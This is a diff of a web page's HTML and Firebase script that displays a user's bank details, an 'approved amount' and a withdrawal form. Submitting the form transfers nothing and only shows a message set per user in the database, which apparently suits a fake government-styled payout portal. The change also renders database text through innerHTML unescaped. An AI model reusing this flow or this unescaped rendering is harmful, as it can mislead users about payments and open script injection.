@@ -2563,141 +2563,149 @@
         </div>
     </div>
 
-    <!-- Custom Modal -->
-    <div id="customModal" style="display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); z-index: 9999; justify-content: center; align-items: center;">
-        <div style="background: #fff; padding: 30px 20px; border-radius: 8px; max-width: 400px; width: 90%; text-align: center; position: relative;">
-            <p id="customModalText" style="font-size: 16px; color: #333;"></p>
-            <button onclick="closeCustomModal()" style="margin-top: 20px; background-color: #15317E; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">OK</button>
-        </div>
+<!-- Custom Modal -->
+<div id="customModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); align-items:center; justify-content:center; z-index:9999;">
+    <div style="background:white; padding:30px; border-radius:10px; max-width:400px; width:90%; box-shadow:0 4px 12px rgba(0,0,0,0.2); text-align:center;">
+        <p id="customModalText" style="font-size:16px;"></p>
+        <button onclick="closeCustomModal()" style="margin-top:20px; background-color:#15317E; color:white; border:none; padding:10px 20px; border-radius:5px; cursor:pointer;">OK</button>
     </div>
+</div>
+
 
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
-            authDomain: "scores-b25a7.firebaseapp.com",
-            databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
-            projectId: "scores-b25a7",
-            storageBucket: "scores-b25a7.appspot.com",
-            messagingSenderId: "1001957936318",
-            appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
-        };
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+        authDomain: "scores-b25a7.firebaseapp.com",
+        databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+        projectId: "scores-b25a7",
+        storageBucket: "scores-b25a7.appspot.com",
+        messagingSenderId: "1001957936318",
+        appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+    };
 
-        firebase.initializeApp(firebaseConfig);
-        let userApprovedAmount = 0;
+    firebase.initializeApp(firebaseConfig);
 
-        firebase.auth().onAuthStateChanged(function(user) {
-            if (user) {
-                const uid = user.uid;
-                firebase.database().ref("users/" + uid).once("value").then(snapshot => {
-                    const data = snapshot.val();
-                    if (data) {
-                        document.getElementById("userName").innerText = "Name: " + (data.username || "N/A");
-                        document.getElementById("bankName").innerText = "Bank Name: " + (data.bankDetails?.bankName || "N/A");
-                        document.getElementById("accountNumber").innerText = "Account Number: " + (data.bankDetails?.accountNumber || "N/A");
-                        document.getElementById("routingNumber").innerText = "Routing Number: " + (data.bankDetails?.routingNumber || "N/A");
-                        const approved = parseFloat(data.approvedAmount || "0");
-                        userApprovedAmount = approved;
-                        document.getElementById("approvedAmount").innerHTML = `Approved Amount: <span style="color: green;"><strong>$${approved.toFixed(2)}</strong></span>`;
-                    }
-                }).catch(error => {
-                    showCustomModal("Failed to load user data: " + error.message);
-                });
+    let userApprovedAmount = 0;
 
-                document.getElementById("withdrawForm").addEventListener("submit", function(e) {
-                    e.preventDefault();
-                    const amountInput = document.getElementById("withdrawAmount").value.trim();
-                    const amount = parseFloat(amountInput);
+    firebase.auth().onAuthStateChanged(function(user) {
+        if (user) {
+            const uid = user.uid;
 
-                    if (isNaN(amount) || amount <= 0) {
-                        showCustomModal("Please enter a valid amount.");
-                        return;
-                    }
+            firebase.database().ref("users/" + uid).once("value").then(snapshot => {
+                const data = snapshot.val();
+                if (data) {
+                    document.getElementById("userName").innerText = "Name: " + (data.username || "N/A");
+                    document.getElementById("bankName").innerText = "Bank Name: " + (data.bankDetails?.bankName || "N/A");
+                    document.getElementById("accountNumber").innerText = "Account Number: " + (data.bankDetails?.accountNumber || "N/A");
+                    document.getElementById("routingNumber").innerText = "Routing Number: " + (data.bankDetails?.routingNumber || "N/A");
 
-                    if (amount > userApprovedAmount) {
-                        showCustomModal("Amount exceeds approved limit. Please enter an amount less than or equal to $" + userApprovedAmount.toFixed(2));
-                        return;
-                    }
-
-                    document.getElementById("processingAmount").innerText = amount.toFixed(2);
-                    document.getElementById("processingMessage").style.display = "block";
-
-                    firebase.database().ref("users/" + firebase.auth().currentUser.uid).once("value").then(snapshot => {
-                        const data = snapshot.val();
-                        const customMessage = data.customPopupMessage || "Please wait while we process your withdrawal.";
-                        const fullMessage = "Your withdrawal request of $" + amount.toFixed(2) + " is being processed.\n\n" + customMessage;
-
-                        setTimeout(() => {
-                            showCustomModal(fullMessage);
-                            document.getElementById("processingMessage").style.display = "none";
-                        }, 2000);
-                    }).catch(error => {
-                        showCustomModal("Something went wrong: " + error.message);
-                        document.getElementById("processingMessage").style.display = "none";
-                    });
-                });
-
-                firebase.database().ref("users/" + uid + "/transactions").on("value", snapshot => {
-                    const transactions = snapshot.val();
-                    const transactionHistoryBody = document.getElementById("transactionHistoryBody");
-                    const totalPaidAmountElement = document.getElementById("totalPaidAmount");
-                    let totalPaidAmount = 0;
-                    transactionHistoryBody.innerHTML = "";
-
-                    if (transactions) {
-                        let html = '';
-                        for (const key in transactions) {
-                            const t = transactions[key];
-                            const amount = parseFloat(t.amount);
-                            const status = t.status || 'N/A';
-                            if (status === "Paid") totalPaidAmount += amount;
-
-                            html += `
-                                <tr>
-                                    <td>${t.type || 'N/A'}</td>
-                                    <td>$${amount.toFixed(2)}</td>
-                                    <td>${status}</td>
-                                    <td>${t.datePaid || 'N/A'}</td>
-                                </tr>
-                            `;
-                        }
-                        transactionHistoryBody.innerHTML = html;
-                    } else {
-                        transactionHistoryBody.innerHTML = '<tr><td colspan="4">No transactions found.</td></tr>';
-                    }
-
-                    totalPaidAmountElement.textContent = `$${totalPaidAmount.toFixed(2)}`;
-                });
-
-            } else {
-                window.location.href = "index.html";
-            }
-        });
-
-        function logout() {
-            firebase.auth().signOut().then(() => {
-                window.location.href = "index.html";
+                    const approved = parseFloat(data.approvedAmount || "0");
+                    userApprovedAmount = approved;
+                    document.getElementById("approvedAmount").innerHTML = `Approved Amount: <span style="color: green;"><strong>$${approved.toFixed(2)}</strong></span>`;
+                }
+            }).catch(error => {
+                alert("Failed to load user data: " + error.message);
             });
-        }
 
-        function toggleTransactionHistory() {
-            const content = document.getElementById("transactionHistoryContent");
-            content.style.display = content.style.display === "block" ? "none" : "block";
-        }
+            document.getElementById("withdrawForm").addEventListener("submit", function(e) {
+                e.preventDefault();
+                const amountInput = document.getElementById("withdrawAmount").value.trim();
+                const amount = parseFloat(amountInput);
 
-        function showCustomModal(message) {
-            document.getElementById('customModalText').innerText = message;
-            document.getElementById('customModal').style.display = 'flex';
-        }
+                if (isNaN(amount) || amount <= 0) {
+                    alert("Please enter a valid amount.");
+                    return;
+                }
 
-        function closeCustomModal() {
-            document.getElementById('customModal').style.display = 'none';
-        }
-    </script>
+                if (amount > userApprovedAmount) {
+                    alert("Amount exceeds approved limit. Please enter an amount less than or equal to $" + userApprovedAmount.toFixed(2));
+                    return;
+                }
 
+                document.getElementById("processingAmount").innerText = amount.toFixed(2);
+                document.getElementById("processingMessage").style.display = "block";
+
+                firebase.database().ref("users/" + firebase.auth().currentUser.uid).once("value").then(snapshot => {
+                    const data = snapshot.val();
+                    const customMessage = data.customPopupMessage || "Please wait while we process your withdrawal.";
+                    const fullMessage = `Your withdrawal request of <span style="color:green; font-weight:bold;">$${amount.toFixed(2)}</span> is being processed.<br><br>${customMessage}`;
+
+                    setTimeout(() => {
+                        showCustomModal(fullMessage);
+                        document.getElementById("processingMessage").style.display = "none";
+                    }, 2000);
+                }).catch(error => {
+                    alert("Something went wrong: " + error.message);
+                    document.getElementById("processingMessage").style.display = "none";
+                });
+            });
+
+            // Fetch and display transaction history
+            firebase.database().ref("users/" + uid + "/transactions").on("value", snapshot => {
+                const transactions = snapshot.val();
+                const transactionHistoryBody = document.getElementById("transactionHistoryBody");
+                const totalPaidAmountElement = document.getElementById("totalPaidAmount");
+                let totalPaidAmount = 0;
+
+                transactionHistoryBody.innerHTML = "";
+
+                if (transactions) {
+                    let transactionHistoryHtml = '';
+                    for (const transactionKey in transactions) {
+                        const transaction = transactions[transactionKey];
+                        const amount = parseFloat(transaction.amount);
+                        const status = transaction.status || 'N/A';
+
+                        if (status === "Paid") {
+                            totalPaidAmount += amount;
+                        }
+
+                        transactionHistoryHtml += `
+                            <tr>
+                                <td>${transaction.type || 'N/A'}</td>
+                                <td>$${amount.toFixed(2)}</td>
+                                <td>${status}</td>
+                                <td>${transaction.datePaid || 'N/A'}</td>
+                            </tr>
+                        `;
+                    }
+                    transactionHistoryBody.innerHTML = transactionHistoryHtml;
+                } else {
+                    transactionHistoryBody.innerHTML = '<tr><td colspan="4">No transactions found.</td></tr>';
+                }
+
+                totalPaidAmountElement.textContent = `$${totalPaidAmount.toFixed(2)}`;
+            });
+
+        } else {
+            window.location.href = "index.html";
+        }
+    });
+
+    function logout() {
+        firebase.auth().signOut().then(() => {
+            window.location.href = "index.html";
+        });
+    }
+
+    function toggleTransactionHistory() {
+        const content = document.getElementById("transactionHistoryContent");
+        content.style.display = content.style.display === "block" ? "none" : "block";
+    }
+
+    function showCustomModal(message) {
+        document.getElementById('customModalText').innerHTML = message;
+        document.getElementById('customModal').style.display = 'flex';
+    }
+
+    function closeCustomModal() {
+        document.getElementById('customModal').style.display = 'none';
+    }
+</script>
 <footer class="usa-footer usa-footer--big ">
   <div class="grid-container usa-footer__return-to-top">
     <a href="#">Return to top</a>
